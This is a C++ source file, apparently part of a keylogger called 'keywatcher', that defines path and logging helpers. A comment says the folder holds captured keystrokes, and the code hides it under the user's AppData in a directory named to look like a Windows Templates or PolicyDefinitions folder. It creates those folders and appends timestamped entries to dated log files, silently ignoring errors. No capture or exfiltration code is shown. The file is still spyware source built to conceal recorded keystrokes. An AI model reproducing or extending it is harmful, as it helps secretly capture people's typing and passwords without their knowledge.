#include <ctime>
#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <windows.h>
#include <cstdlib>

#include "../include/keywatcher.h"

template <class T>
std::string kw::to_string(const T& value) {
  std::ostringstream s;

  s << value;

  return s.str();
}


std::string kw::fetch_apps_root_path() {
  // to fetch path C:\Users\USERNAME\AppData\Roaming
  std::string base_path = getenv("APPDATA");

  // path we want to put keystrokes and keywatcher logs
  std::string apps_path = "\\Microsoft\\Windows\\Templates\\dumps0x45gg\\";

  return base_path + apps_path;
}


std::string kw::fetch_log_path() {
  // location to put all log files
  return kw::fetch_apps_root_path() + "PolicyDefinitions\\";
}


bool kw::make_dir(std::string path) {
  // Return True(1) if the folder already exists or successfully created
  return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}


bool kw::validate_path(std::string path) {
  // looping through the path and checking at each \\ for path's existence
  for (char &ch : path) {
    if (ch == '\\') {
      // if we reached \\ then check the path till that exists
      ch = '\0';
      if (!kw::make_dir(path)) {
        // can't able to create dir at this specific position
        return false;
      }
      ch = '\\';
    }
  }
  return true;
}


void kw::log(const std::string s) {
  // get path to put log files
  std::string path = kw::fetch_log_path();

  if (!validate_path(path))
    return;

  kw::datetime dt = kw::datetime();

  // get file name based on current date and month
  std::string filename = dt.get_dated_filename() + ".log";

  try {
    std::ofstream file(path + filename, std::ios::app);     // opening file in append mode

    // check if file opened successfully
    if (!file)
      return;

    file << "[" << dt.now() << "] " << s << std::endl;
    file.close();
  }
  catch(...) {
    // if any exception thrown while writing to log file we are catching it and
    // ignoring it as of now.
    return;
  }
}
